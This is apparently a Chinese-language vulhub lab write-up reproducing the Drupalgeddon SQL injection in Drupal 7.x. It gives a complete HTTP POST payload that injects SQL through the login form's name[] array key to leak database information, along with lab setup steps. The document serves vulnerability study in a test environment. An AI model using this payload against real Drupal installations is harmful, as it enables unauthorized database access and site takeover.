# Drupal < 7.32 “Drupalgeddon” SQL注入漏洞

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包改包--->信息被爆出

### 0x01漏洞介绍

​			Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。

##### 影响版本

```
Drupal < 7.31
```

### 0x02漏洞复现

#### payload：

```
POST /?q=node&destination=node HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a
```

​			**环境启动后，访问`http://your-ip:8080`即可看到Drupal的安装页面，使用默认配置安装即可。**

**其中，Mysql数据库名填写`drupal`，数据库用户名、密码为`root`，地址为`mysql`**

​				![Drupal_Drupalgeddon_SQL注入漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_Drupalgeddon_SQL注入漏洞_1.jpg)

​			**默认页面**

![Drupal_Drupalgeddon_SQL注入漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_Drupalgeddon_SQL注入漏洞_2.jpg)

​			**抓包改包，发现信息被爆出**

![Drupal_Drupalgeddon_SQL注入漏洞_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Drupal_Drupalgeddon_SQL注入漏洞_3.jpg)



### 





